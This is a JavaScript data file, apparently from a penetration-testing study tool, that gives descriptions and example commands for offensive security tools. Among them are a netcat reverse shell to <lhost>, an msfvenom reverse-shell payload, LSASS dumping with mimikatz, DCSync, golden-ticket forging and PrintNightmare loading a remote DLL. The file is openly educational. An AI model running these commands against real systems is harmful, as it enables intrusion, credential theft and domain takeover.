    'mssqlclient.py': 'Impacket MSSQL client — query and xp_cmdshell.',
    'impacket-mssqlclient': 'Impacket MSSQL client — query and xp_cmdshell.',
    'bloodhound-python': 'Collect BloodHound data remotely from Linux.',
    sprayhound: 'Password-spray AD and mark owned in BloodHound.',
    metasploit: 'The Metasploit console — exploits and post modules.',
    msfvenom: 'Generate payloads and shellcode in any format.',
    'git-dumper': 'Reconstruct source from an exposed .git directory.',
  };
  Object.keys(PURPOSE).forEach(function (k) { if (A[k] && !(A[k].purpose || '').trim()) A[k].purpose = PURPOSE[k]; });

  // Fuller "what it is / what you use it for" descriptions for the Loadout hover cards — written to teach a
  // newcomer, not just label the tool. (`purpose` stays the short chip/catalog label.) Educational; proper caps.
  var DESC = {
    nmap: 'The go-to network scanner. Run it first on any target to discover open ports and fingerprint the services and versions behind them — the map that tells you where to attack.',
    masscan: 'An Internet-scale port scanner built for raw speed. Use it to sweep huge IP ranges or all 65,535 ports far faster than Nmap, then follow up with Nmap on whatever it finds.',
    rustscan: 'A very fast port scanner that finds open ports in seconds and hands them straight to Nmap for service detection — masscan’s speed with Nmap’s depth.',
    dig: 'A DNS query tool. Look up a domain’s records (A, MX, NS, TXT) and attempt zone transfers (AXFR), which can dump every record a misconfigured DNS server knows.',
    nslookup: 'A simple DNS lookup client. Quickly resolve names to IPs and check A/MX/NS records against a specific DNS server.',
    dnsenum: 'A DNS enumeration tool. Pulls records, tries zone transfers, and brute-forces subdomains to map out a target’s DNS footprint.',
    dnsrecon: 'A DNS reconnaissance tool. Enumerates records, attempts AXFR zone transfers, and brute-forces hostnames to surface servers you didn’t know existed.',
    onesixtyone: 'A fast SNMP scanner. Sprays a list of community strings (like “public”) at hosts to find devices with SNMP exposed and guessable.',
    snmpwalk: 'Queries a device over SNMP and walks its data tree (OIDs), which can leak running processes, user accounts, network routes, and installed software.',
    'snmp-check': 'A friendlier SNMP enumerator that formats everything a host exposes over SNMP into readable sections — users, processes, shares, and more.',
    'smtp-user-enum': 'Probes a mail server with VRFY/EXPN/RCPT to confirm which usernames exist — a quick way to build a valid user list for password attacks.',
    swaks: 'A flexible SMTP test client. Use it to talk to a mail server, test for open relays, and craft or send emails.',
    'ike-scan': 'Fingerprints and enumerates IPsec VPN gateways over IKE, revealing the VPN in use and sometimes an aggressive-mode handshake you can crack offline.',
    finger: 'A client for the legacy finger service. Where it’s exposed it reveals usernames and login details — old, but still seen on exam and CTF boxes.',
    ftp: 'A command-line FTP client. Connect to FTP servers (often with anonymous login) to browse and pull files that may hold creds or source code.',
    ldapsearch: 'Queries a domain controller’s LDAP directory directly. With valid or anonymous bind you can dump users, groups, and attributes across the whole domain.',
    windapsearch: 'Automates the common Active Directory LDAP queries — list all users, groups, computers, and admins — so you don’t hand-craft ldapsearch filters.',
    kerbrute: 'Tests Kerberos pre-authentication to enumerate valid domain usernames and to password-spray — fast and quiet, since it avoids normal logon logging.',
    smbclient: 'An interactive SMB/Windows file-share client. List shares on a host and download files from them, including with anonymous or guest access.',
    smbmap: 'Enumerates SMB shares across hosts and shows exactly which ones you can read or write — the fast way to find loot on Windows networks.',
    rpcclient: 'Talks to Windows over MS-RPC. With a null or authenticated session you can enumerate users, groups, and password policy from a domain or server.',
    enum4linux: 'A classic all-in-one wrapper that runs many SMB/Samba checks (users, shares, groups, policy) against a Windows or Samba host in one shot.',
    'enum4linux-ng': 'A modern rewrite of enum4linux with cleaner output and JSON/YAML export. Same job: enumerate everything SMB will give up about a host.',
    nxc: 'NetExec (formerly CrackMapExec) — the Swiss-army knife for Windows networks. Validate and spray creds across SMB/WinRM/LDAP/MSSQL, dump hashes, and enumerate shares.',
    nltest: 'A built-in Windows command (run on the target) for discovering domain controllers and mapping domain trust relationships during AD enumeration.',
    kinit: 'Requests a Kerberos ticket (TGT) from a password, hash, or keytab and stores it in your ticket cache — the setup step for pass-the-ticket.',
    klist: 'Lists the Kerberos tickets in your cache so you can confirm which TGT/TGS you hold before using them against services.',
    responder: 'Answers Windows name-resolution requests (LLMNR/NBT-NS/mDNS) on the local network to make machines authenticate to you, capturing their NetNTLM hashes for cracking or relaying.',
    ntlmrelayx: 'Takes NTLM authentication you’ve captured or coerced and relays it to machines you lack creds for — a core way to move laterally without cracking a password.',
    mitm6: 'Abuses Windows’ preference for IPv6 by acting as a rogue DHCPv6/DNS server, funnelling victim authentication to you so it can be relayed (usually with ntlmrelayx).',
    hashcat: 'A GPU-accelerated password cracker. Feed it captured hashes and a wordlist (plus rules or masks) and it recovers plaintext passwords offline — the fastest way to crack at scale.',
    john: 'John the Ripper — a versatile CPU password cracker. Handles many hash formats and ships the *2john helpers that pull crackable hashes out of files and archives.',
    hashid: 'Identifies what kind of hash you’re looking at from its format, so you know which hashcat/John mode to use before cracking.',
    'name-that-hash': 'A modern hash identifier — paste a hash and it names the likely algorithm and the matching hashcat mode.',
    'gpp-decrypt': 'Decrypts passwords Windows stored in Group Policy Preferences. Microsoft published the key, so any cpassword found in SYSVOL is instantly recoverable.',
    'psk-crack': 'Cracks the pre-shared key from an IPsec VPN aggressive-mode handshake captured with ike-scan, turning a VPN into a foothold.',
    '7z2john': 'Extracts a crackable hash from a password-protected 7-Zip archive so John or hashcat can recover the password.',
    rar2john: 'Extracts a crackable hash from a password-protected RAR archive for offline cracking.',
    zip2john: 'Extracts a crackable hash from a password-protected ZIP archive so you can crack it offline.',
    hydra: 'An online brute-force and password-spray tool. Throws username/password guesses at live services (SSH, RDP, HTTP forms, FTP, and dozens more) to find valid logins.',
    ffuf: 'A fast web fuzzer. Put a FUZZ keyword in a URL to brute-force directories, files, virtual hosts, or parameters and uncover hidden parts of a web app.',
    feroxbuster: 'A fast, recursive content-discovery tool. Point it at a site and it brute-forces directories and files, automatically diving into the ones it finds.',
    gobuster: 'Brute-forces hidden web content, DNS subdomains, or virtual hosts from a wordlist — a staple for finding pages and vhosts an app doesn’t link to.',
    wfuzz: 'A web fuzzer for brute-forcing anything in a request — directories, parameters, headers, values — useful for locating injection points and hidden inputs.',
    nikto: 'A web-server scanner that checks for thousands of known dangerous files, outdated software, and common misconfigurations to flag quick wins.',
    wpscan: 'A WordPress scanner. Enumerates users, themes, and plugins and flags known vulnerabilities — the first thing to run against any WordPress site.',
    whatweb: 'Fingerprints a website: web server, frameworks, CMS, and their versions — so you know what you’re dealing with before choosing an attack.',
    sqlmap: 'Automates finding and exploiting SQL injection — detects injectable parameters, dumps databases, and can even run commands on the database server.',
    arjun: 'Discovers hidden HTTP parameters an endpoint accepts but doesn’t advertise — often the way into injection, IDOR, or debug functionality.',
    wget: 'A command-line downloader. Pull files or whole pages over HTTP(S)/FTP — commonly used to grab tools onto a target or mirror a site.',
    curl: 'The universal command-line HTTP client. Craft any request, inspect headers and responses, hit APIs, and script web interactions — essential for manual web testing.',
    nc: 'Netcat — the TCP/IP Swiss-army knife. Open raw connections, set up listeners to catch reverse shells, and move data between machines.',
    ncat: 'Nmap’s modern netcat. Same raw connections and listeners as nc, plus TLS, proxies, and access control — a sturdier shell catcher.',
    openssl: 'A full TLS toolkit. Connect to and inspect HTTPS services, read certificates for hostnames and hidden domains, and generate keys and certs.',
    mount: 'Attaches a remote or local filesystem to your machine — commonly used to mount an exposed NFS or SMB export and browse its files directly.',
    showmount: 'Lists the NFS exports a server offers and who may mount them — the recon step before mounting a network file share.',
    python3: 'The scripting workhorse. Run exploit scripts, and spin up an instant web server (python3 -m http.server) to transfer files to and from targets.',
    java: 'The Java runtime, needed to run .jar tooling such as ysoserial (deserialization payloads) and the BloodHound GUI.',
    svn: 'A Subversion client. Where a repo is exposed, check it out to recover source code — and its history, which often holds removed secrets.',
    rlwrap: 'Wraps a program to add readline features. Run your netcat listener through it for command history and arrow-key editing in otherwise raw reverse shells.',
    ssh: 'The secure shell client. Log into Linux hosts, and build tunnels and port-forwards to pivot through a compromised machine into networks behind it.',
    sshpass: 'Supplies an SSH password non-interactively so you can script logins or spray credentials without being prompted each time.',
    xfreerdp: 'A Remote Desktop (RDP) client for Windows. Log in with a password or, via pass-the-hash, with an NTLM hash.',
    vncviewer: 'A VNC client for graphical remote-control services — useful against exposed or weakly/zero-authenticated VNC servers.',
    'evil-winrm': 'The go-to interactive shell over Windows Remote Management (WinRM/5985). Log in with a password or hash for a feature-rich PowerShell session with upload/download built in.',
    proxychains: 'Forces a command-line tool to route its traffic through a proxy (usually a SOCKS proxy from your pivot), so you can reach internal hosts with your normal tools.',
    proxychains4: 'The current proxychains. Same job: tunnel tools like Nmap or NetExec through a SOCKS proxy to attack networks behind a compromised host.',
    sshuttle: 'Turns a plain SSH login into a lightweight VPN, routing whole subnets through the pivot so your tools reach internal hosts with no per-tool proxy setup.',
    mysql: 'The MySQL command-line client. Connect to a MySQL server to read data and, with the right privileges, read/write files or run commands on the host.',
    mariadb: 'The MariaDB client (a drop-in MySQL replacement). Same use: query exposed databases and look for file read/write or command-exec paths.',
    psql: 'The PostgreSQL client. Connect to a Postgres server to query data and, with enough privileges, reach file access or command execution.',
    'redis-cli': 'The Redis client. Connect to an exposed Redis instance to read its data and abuse it to write files (webshells, SSH keys, cron jobs) for code execution.',
    'mssqlclient.py': 'Impacket’s MSSQL client. Log in with domain or SQL creds to query databases and enable xp_cmdshell to run OS commands on the server.',
    'impacket-mssqlclient': 'Impacket’s MSSQL client. Authenticate to SQL Server and, with privileges, turn on xp_cmdshell to execute OS commands on the host.',
    'bloodhound-python': 'Collects Active Directory data (users, groups, sessions, ACLs) remotely from Linux and outputs it for BloodHound, which maps attack paths to Domain Admin.',
    sprayhound: 'Password-sprays AD accounts safely (respecting lockout policy) and marks any it compromises as owned in BloodHound.',
    metasploit: 'The Metasploit Framework console — a huge library of exploits, payloads, and post-exploitation modules in one tool. (OSCP limits its use to a single target.)',
    msfvenom: 'Generates payloads and shellcode in any format (exe, elf, raw, and more) — most often used to build a reverse shell to deliver to a target.',
    'git-dumper': 'Reconstructs a web app’s source code from an exposed .git directory, which frequently contains hard-coded credentials and secrets in its history.',
    certipy: 'The AD Certificate Services attack tool. Finds and exploits vulnerable certificate templates (ESC1–ESC8) to obtain certs that authenticate as privileged users.',
    bloodyad: 'Reads and abuses Active Directory objects over LDAP — enumerate what you can write to, then flip attributes or ACLs to escalate privileges.',
    coercer: 'Forces a Windows host (often a DC) to authenticate to you across many RPC methods — the trigger half of coerce-and-relay attacks like PetitPotam.',
    pywhisker: 'Adds “shadow credentials” (a key you control) to an account you can write to, letting you authenticate as it via certificates — a stealthy takeover.',
    targetedkerberoast: 'Temporarily sets an SPN on accounts you can write to, Kerberoasts them for a crackable hash, then cleans up — Kerberoasting without a pre-existing SPN.',
    sccmhunter: 'Enumerates and attacks Microsoft SCCM/MECM, which often holds network-access-account credentials and offers paths to mass code execution.',
    pygpoabuse: 'Abuses write access to a Group Policy Object to push a scheduled task to every machine it applies to — a fast route to code execution or privilege escalation.',
    'zerologon-scan': 'Safely checks whether a domain controller is vulnerable to Zerologon (CVE-2020-1472), a flaw that can reset the DC machine account and hand over the domain.',
    'petitpotam.py': 'Coerces a Windows host (classically a DC) to authenticate to you via EFSRPC (PetitPotam) — the trigger for relaying to AD CS or another host.',
    'printerbug.py': 'Uses the MS-RPRN “printer bug” to coerce a target into authenticating to you — another trigger for coerce-and-relay lateral movement.',
    'dfscoerce.py': 'Coerces authentication from a Windows host via the MS-DFSNM interface — a coercion trigger that often works when PetitPotam is patched.',
    'nopac.py': 'Exploits the noPac / sAMAccountName-spoofing flaws (CVE-2021-42278/42287) to escalate from a normal domain user to Domain Admin on unpatched DCs.',
    'cve-2021-1675.py': 'Exploits PrintNightmare (CVE-2021-1675/34527) in the Windows Print Spooler to run code as SYSTEM, locally or remotely.',
    linpeas: 'Runs a huge battery of Linux privilege-escalation checks and highlights the promising findings (sudo rights, SUID binaries, creds, misconfigs) in color.',
    linenum: 'A lighter Linux local-enumeration script that gathers system, user, and config details to help you spot privilege-escalation openings.',
    'linux-exploit-suggester': 'Compares a Linux host’s kernel and packages against known exploits and suggests which public privilege-escalation exploits are likely to work.',
    pspy: 'Watches processes and scheduled tasks on Linux in real time without root — great for catching cron jobs and commands that run as other users.',
    socat: 'A more capable netcat. Build encrypted shells, relays, and port-forwards, and upgrade a basic reverse shell into a stable interactive (TTY) one.',
    winpeas: 'The Windows counterpart to linPEAS. Enumerates the host for privilege-escalation paths — weak service configs, stored creds, tokens, and more.',
    'winpeas-bat': 'A .bat build of winPEAS for constrained Windows shells where the .exe won’t run — same privilege-escalation enumeration.',
    seatbelt: 'A C# host-survey tool that collects dozens of security-relevant details from a Windows machine (creds, tokens, configs) to find privesc and lateral-movement leads.',
    powerview: 'A PowerShell toolkit for Active Directory recon — enumerate users, groups, ACLs, trusts, and sessions directly from a compromised Windows host.',
    procdump: 'A signed Microsoft (Sysinternals) tool that dumps a process’s memory. Operators dump LSASS with it so credentials can be extracted offline with pypykatz/mimikatz.',
    godpotato: 'A local Windows privilege-escalation exploit that abuses impersonation privileges (SeImpersonate) to go from a service account to SYSTEM on modern Windows.',
    rubeus: 'A C# Kerberos abuse toolkit for Windows — request, forge, and pass tickets; Kerberoast and AS-REP roast; and run overpass-the-hash from a foothold.',
    mimikatz: 'The well-known Windows credential tool. Extracts passwords, hashes, and Kerberos tickets from memory and performs pass-the-hash/ticket and golden-ticket attacks.',
    pypykatz: 'A pure-Python reimplementation of mimikatz. Parses credentials out of an LSASS memory dump on your own machine, so you needn’t run mimikatz on the target.',
    sharphound: 'The data collector for BloodHound. Run it on a Windows foothold to gather AD objects, sessions, and ACLs, then analyze the output to find paths to Domain Admin.',
    sharpwsus: 'Abuses an internal WSUS (Windows Update) server you control to push a malicious update to its clients — a lateral-movement and privilege-escalation path in enterprise AD.',
    sharpsccm: 'Attacks Microsoft SCCM/MECM from a client — extract network-access-account credentials and abuse client-push to run code on other managed machines.',
    wesng: 'Windows Exploit Suggester – Next Generation. Compares a host’s patch level (from systeminfo) against Microsoft’s database to list missing patches with public exploits.',
    'nc.exe': 'A Windows build of netcat. Upload it to a target to create reverse shells or move data when the built-in tools are limited.',
    chisel: 'A fast TCP/UDP tunnel over HTTP. Run the server on Kali and the client on a compromised host to build a SOCKS proxy or port-forwards into internal networks.',
    'ligolo-ng': 'A modern pivoting tool that creates a real network interface to the target’s internal subnets, so you reach internal hosts as if locally connected — cleaner than proxychains.',
    'autoblue-ms17-010': 'A ready-to-use exploit chain for EternalBlue (MS17-010), the SMBv1 flaw that gives SYSTEM-level code execution on unpatched Windows hosts.',
    ysoserial: 'Generates Java deserialization payloads (gadget chains). When an app unsafely deserializes attacker data, these turn that flaw into remote code execution.',
    'impacket-getuserspns': 'Performs Kerberoasting — requests service tickets for accounts that have an SPN and returns their crackable hashes, a top route to domain credentials.',
    'impacket-getnpusers': 'Performs AS-REP roasting — finds domain accounts that don’t require Kerberos pre-auth and returns their crackable hashes, no password needed to start.',
    'impacket-getst': 'Requests Kerberos service tickets, including S4U (constrained-delegation) abuse to impersonate another user — e.g., Administrator — to a target service.',
    'impacket-gettgt': 'Requests a Kerberos TGT from a password, NT hash, or AES key and saves it as a ccache for pass-the-ticket authentication.',
    'impacket-ticketer': 'Forges Kerberos tickets — golden (with the krbtgt hash) and silver — to impersonate any user, including Domain Admin, once you hold the right key.',
    'impacket-secretsdump': 'Dumps password hashes and secrets remotely — SAM, LSA, cached creds, and full domain hashes via DCSync — the classic post-compromise credential grab.',
    'impacket-psexec': 'Gets a SYSTEM shell on a Windows host over SMB using valid creds or a hash (pass-the-hash) — the textbook remote-code-execution method.',
    'impacket-wmiexec': 'Runs commands on a Windows host over WMI with creds or a hash — a quieter, semi-interactive alternative to psexec that creates no service.',
    'impacket-dcomexec': 'Executes commands on a Windows host over DCOM with creds or a hash — another lateral-movement option when SMB-based methods are blocked.',
    'impacket-addcomputer': 'Adds a machine account to the domain (allowed to normal users by default) — a prerequisite for RBCD and other AD privilege-escalation chains.',
    'impacket-rbcd': 'Configures resource-based constrained delegation on a target computer object — an ACL-abuse path to impersonate privileged users and take over the host.',
    'impacket-dacledit': 'Reads and edits the DACLs (access-control entries) on AD objects — used to grant yourself rights like DCSync by abusing weak permissions.',
    'impacket-lookupsid': 'Brute-forces RIDs through a null or authenticated session to enumerate domain users and groups when LDAP isn’t available.',
    'impacket-raisechild': 'Automates a child-to-parent domain escalation across a forest trust, elevating from child-domain admin to enterprise admin.',
    'impacket-goldenpac': 'Exploits MS14-068 to forge a privileged Kerberos ticket from a normal user, instantly escalating to Domain Admin on unpatched DCs.',
    'impacket-smbserver': 'Spins up a quick SMB server on Kali — used to serve files to targets and to capture NetNTLM hashes from incoming authentication.',
    'impacket-dpapi': 'Decrypts Windows DPAPI-protected secrets (saved browser, RDP, and Wi-Fi credentials, vault blobs) once you have the user’s password or master key.',
  };
  Object.keys(DESC).forEach(function (k) { if (A[k]) A[k].desc = DESC[k]; });

  // remaining descriptions + more examples, and let the nxc aliases inherit nxc's card.
  var MOREDESC = {
    bloodhound: 'The BloodHound graph UI that maps Active Directory attack paths to Domain Admin. obol analyses the same collection data on-site, so the GUI is optional.',
    penelope: 'An advanced reverse-shell handler. Catches shells, auto-upgrades them to a full TTY, manages multiple sessions, logs everything, and transfers files.',
    ntpdate: 'Syncs your clock to the target or DC. Kerberos rejects tickets when clocks drift (KRB_AP_ERR_SKEW), so sync before AD attacks.',
  };
  Object.keys(MOREDESC).forEach(function (k) { if (A[k] && !(A[k].desc || '').trim()) A[k].desc = MOREDESC[k]; });
  var MOREEX = {
    penelope: 'penelope 4444',
    socat: 'socat file:`tty`,raw,echo=0 TCP-LISTEN:4444',
    linenum: './LinEnum.sh -t',
    'linux-exploit-suggester': './linux-exploit-suggester.sh',
    seatbelt: 'Seatbelt.exe -group=all',
    powerview: 'Import-Module .\\PowerView.ps1; Get-DomainUser',
    procdump: 'procdump64.exe -accepteula -ma lsass.exe out.dmp',
    godpotato: 'GodPotato-NET4.exe -cmd "cmd /c whoami"',
    'winpeas-bat': 'winPEAS.bat',
    'nc.exe': 'nc64.exe <lhost> 4444 -e cmd.exe',
    ntpdate: 'sudo ntpdate <dc-ip>',
    wesng: 'wes.py systeminfo.txt',
    sharpsccm: 'SharpSCCM.exe get naa',
    sharpwsus: 'SharpWSUS.exe inspect',
    'autoblue-ms17-010': 'python eternalblue_exploit7.py <target> sc.bin',
    'impacket-dcomexec': 'impacket-dcomexec <domain>/<user>:<pass>@<target>',
    'impacket-getst': 'impacket-getST -spn cifs/<target> -impersonate Administrator <domain>/<user>:<pass>',
    'impacket-ticketer': 'impacket-ticketer -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> Administrator',
    'impacket-addcomputer': "impacket-addcomputer <domain>/<user>:<pass> -computer-name 'PWN$' -computer-pass 'P@ss123'",
    'impacket-rbcd': 'impacket-rbcd -delegate-from PWN$ -delegate-to <target>$ -action write <domain>/<user>:<pass>',
    'impacket-dacledit': 'impacket-dacledit -action write -rights DCSync -principal <user> -target-dn <domain-dn> <domain>/<user>:<pass>',
    'impacket-lookupsid': 'impacket-lookupsid <domain>/<user>:<pass>@<dc-ip>',
    'impacket-raisechild': 'impacket-raiseChild <child-domain>/<user>:<pass>',
    'impacket-goldenpac': 'impacket-goldenPac <domain>/<user>:<pass>@<dc-fqdn>',
    'impacket-dpapi': 'impacket-dpapi masterkey -file <mk> -sid <sid> -password <pass>',
    sccmhunter: 'sccmhunter find -u <user> -p <pass> -d <domain> -dc-ip <dc-ip>',
    pygpoabuse: 'pygpoabuse.py <domain>/<user>:<pass> -gpo-id <id>',
    'zerologon-scan': 'zerologon_tester.py <dc-netbios> <dc-ip>',
    'petitpotam.py': 'petitpotam.py -u <user> -p <pass> <listener-ip> <dc-ip>',
    'printerbug.py': 'printerbug.py <domain>/<user>:<pass>@<target> <listener-ip>',
    'dfscoerce.py': 'dfscoerce.py -u <user> -p <pass> <listener-ip> <dc-ip>',
    'nopac.py': 'nopac.py <domain>/<user>:<pass> -dc-ip <dc-ip> --impersonate administrator -shell',
    'cve-2021-1675.py': 'cve-2021-1675.py <domain>/<user>:<pass>@<target> "\\\\\\\\<lhost>\\\\share\\\\evil.dll"',
    ysoserial: 'java -jar ysoserial.jar CommonsCollections5 "<cmd>"',
    netexec: 'nxc smb <target> -u <user> -p <pass> --shares',
    crackmapexec: 'nxc smb <target> -u <user> -p <pass> --shares',
    cme: 'nxc smb <target> -u <user> -p <pass> --shares',
  };
  Object.keys(MOREEX).forEach(function (k) { if (A[k] && !(A[k].example || '').trim()) A[k].example = MOREEX[k]; });
  ['netexec', 'crackmapexec', 'cme'].forEach(function (n) {
    if (A[n]) { if (!(A[n].desc || '').trim()) A[n].desc = A.nxc.desc; if (!(A[n].example || '').trim()) A[n].example = A.nxc.example; }
  });

  // One canonical example per tool for the Loadout hover cards — teaching syntax a newcomer can adapt
  // (placeholders like <target> / <user> / <dc-ip>). Educational invocation only; swap in your own values.
  var EXAMPLE = {
    nmap: 'nmap -sC -sV -p- -oN scan.txt <target>',
    masscan: 'masscan -p1-65535 --rate 1000 <target>',
    rustscan: 'rustscan -a <target> -- -sC -sV',
    dig: 'dig axfr <domain> @<dc-ip>',
    nslookup: 'nslookup <domain> <dc-ip>',
    dnsenum: 'dnsenum --dnsserver <dc-ip> <domain>',
    dnsrecon: 'dnsrecon -d <domain> -n <dc-ip> -t axfr',
    onesixtyone: 'onesixtyone -c community.txt <target>',
    snmpwalk: 'snmpwalk -v2c -c public <target>',
    'snmp-check': 'snmp-check <target> -c public',
    'smtp-user-enum': 'smtp-user-enum -M RCPT -U users.txt -t <target>',
    swaks: 'swaks --to user@<domain> --server <target>',
    'ike-scan': 'ike-scan -M <target>',
    finger: 'finger root@<target>',
    ftp: 'ftp <target>',
    ldapsearch: 'ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local"',
    windapsearch: 'windapsearch.py -d <domain> --dc <dc-ip> -U',
    kerbrute: 'kerbrute userenum -d <domain> --dc <dc-ip> users.txt',
    smbclient: 'smbclient -L //<target> -N',
    smbmap: 'smbmap -H <target> -u <user> -p <pass>',
    rpcclient: 'rpcclient -U "" -N <target>',
    enum4linux: 'enum4linux -a <target>',
    'enum4linux-ng': 'enum4linux-ng -A <target>',
    nxc: 'nxc smb <target> -u <user> -p <pass> --shares',
    nltest: 'nltest /dclist:<domain>',
    kinit: 'kinit <user>@<REALM>',
    klist: 'klist',
    responder: 'sudo responder -I tun0',
    ntlmrelayx: 'impacket-ntlmrelayx -tf targets.txt -smb2support',
    mitm6: 'sudo mitm6 -d <domain>',
    hashcat: 'hashcat -m 1000 hashes.txt rockyou.txt',
    john: 'john --wordlist=rockyou.txt hashes.txt',
    hashid: "hashid '<hash>'",
    'name-that-hash': "nth -t '<hash>'",
    'gpp-decrypt': "gpp-decrypt '<cpassword>'",
    'psk-crack': 'psk-crack -d rockyou.txt psk.txt',
    '7z2john': '7z2john secret.7z > hash.txt',
    rar2john: 'rar2john secret.rar > hash.txt',
    zip2john: 'zip2john secret.zip > hash.txt',
    hydra: 'hydra -L users.txt -P rockyou.txt <target> ssh',
    ffuf: 'ffuf -u http://<target>/FUZZ -w <wordlist>',
    feroxbuster: 'feroxbuster -u http://<target> -w <wordlist>',
    gobuster: 'gobuster dir -u http://<target> -w <wordlist>',
    wfuzz: 'wfuzz -w <wordlist> http://<target>/FUZZ',
    nikto: 'nikto -h http://<target>',
    wpscan: 'wpscan --url http://<target> --enumerate u',
    whatweb: 'whatweb http://<target>',
    sqlmap: 'sqlmap -u "http://<target>/?id=1" --batch --dbs',
    arjun: 'arjun -u http://<target>/api',
    wget: 'wget http://<target>/file',
    curl: 'curl -sk http://<target>/',
    nc: 'nc -lvnp 4444',
    ncat: 'ncat --ssl -lvnp 4444',
    openssl: 'openssl s_client -connect <target>:443',
    mount: 'sudo mount -t nfs <target>:/export /mnt',
    showmount: 'showmount -e <target>',
    python3: 'python3 -m http.server 80',
    java: 'java -jar tool.jar',
    svn: 'svn checkout svn://<target>/',
    rlwrap: 'rlwrap nc -lvnp 4444',
    ssh: 'ssh <user>@<target>',
    sshpass: "sshpass -p '<pass>' ssh <user>@<target>",
    xfreerdp: 'xfreerdp /u:<user> /p:<pass> /v:<target>',
    vncviewer: 'vncviewer <target>::5900',
    'evil-winrm': 'evil-winrm -i <target> -u <user> -p <pass>',
    proxychains: 'proxychains nmap -sT <target>',
    proxychains4: 'proxychains4 nxc smb <target>',
    sshuttle: 'sshuttle -r <user>@<target> 10.10.10.0/24',
    mysql: 'mysql -h <target> -u root -p',
    mariadb: 'mariadb -h <target> -u root -p',
    psql: 'psql -h <target> -U postgres',
    'redis-cli': 'redis-cli -h <target>',
    'mssqlclient.py': 'impacket-mssqlclient <user>:<pass>@<target>',
    'impacket-mssqlclient': 'impacket-mssqlclient <user>:<pass>@<target>',
    'bloodhound-python': 'bloodhound-python -d <domain> -u <user> -p <pass> -c all -ns <dc-ip>',
    sprayhound: 'sprayhound -d <domain> -U users.txt -dc <dc-ip>',
    metasploit: 'msfconsole -q',
    msfvenom: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f exe -o shell.exe',
    'git-dumper': 'git-dumper http://<target>/.git ./loot',
    // key AD / credential tools (these already carry a purpose from the install registry)
    'impacket-getuserspns': 'impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request',
    'impacket-getnpusers': 'impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip>',
    'impacket-secretsdump': 'impacket-secretsdump <domain>/<user>:<pass>@<target>',
    'impacket-psexec': 'impacket-psexec <domain>/<user>:<pass>@<target>',
    'impacket-wmiexec': 'impacket-wmiexec <domain>/<user>:<pass>@<target>',
    'impacket-gettgt': 'impacket-getTGT <domain>/<user>:<pass>',
    'impacket-smbserver': 'impacket-smbserver share . -smb2support',
    certipy: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip>',
    bloodyad: 'bloodyAD -d <domain> -u <user> -p <pass> --host <dc-ip> get writable',
    coercer: 'coercer coerce -t <target> -l <lhost> -u <user> -p <pass>',
    pywhisker: 'pywhisker -d <domain> -u <user> -p <pass> --target <victim> --action add',
    targetedkerberoast: 'targetedKerberoast.py -d <domain> -u <user> -p <pass>',
    linpeas: './linpeas.sh | tee linpeas.out',
    winpeas: 'winPEASx64.exe',
    pspy: './pspy64',
    chisel: 'chisel server -p 8000 --reverse',
    'ligolo-ng': './ligolo-proxy -selfcert',
    sharphound: 'SharpHound.exe -c All',
    mimikatz: 'mimikatz.exe "sekurlsa::logonpasswords" exit',
    rubeus: 'Rubeus.exe kerberoast',
    pypykatz: 'pypykatz lsa minidump lsass.dmp',
  };
  Object.keys(EXAMPLE).forEach(function (k) { if (A[k] && !A[k].example) A[k].example = EXAMPLE[k]; });

  OBOL.ARSENAL = A;
})(typeof globalThis !== 'undefined' ? globalThis : this);
